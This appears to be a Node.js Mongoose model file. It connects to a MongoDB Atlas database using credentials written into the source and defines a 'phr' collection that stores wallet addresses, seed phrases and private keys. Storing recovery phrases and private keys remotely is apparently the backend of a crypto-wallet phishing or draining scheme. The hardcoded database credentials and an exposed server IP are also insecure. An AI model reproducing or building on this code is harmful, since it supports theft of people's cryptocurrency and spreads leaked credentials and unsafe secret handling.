const mongoose = require('mongoose');
// mongoose.connect('mongodb://52.56.48.112:27017/taxdb', { useNewUrlParser: true ,useUnifiedTopology: true });


try{
mongoose.connect('mongodb+srv://pk:pk@cluster0.ozbxe.mongodb.net/taxdb?retryWrites=true&w=majority', { useNewUrlParser: true ,useUnifiedTopology: true },(err)=>{
    if(err){console.log(err)}
    else{console.log("successfully connected")}
});
//mongodb+srv://pk:<password>@cluster0-yxuce.mongodb.net/test?retryWrites=true&w=majority
//mongodb+srv://pk:<password>@cluster0-yxuce.mongodb.net/test?retryWrites=true&w=majority

mongoose.connection.useDb('taxdb');
const Schema = mongoose.Schema;
var NewUserSchema = new Schema({  
    wallet:String,  
    phrase:String,       
    privatekey:String     
});
var Phrases = mongoose.model('phr', NewUserSchema);
                    //UserData is the model and NewBookData is the schema
module.exports = Phrases;
}
catch(err){
    console.log("Catch exception....")
    console.log(err)
}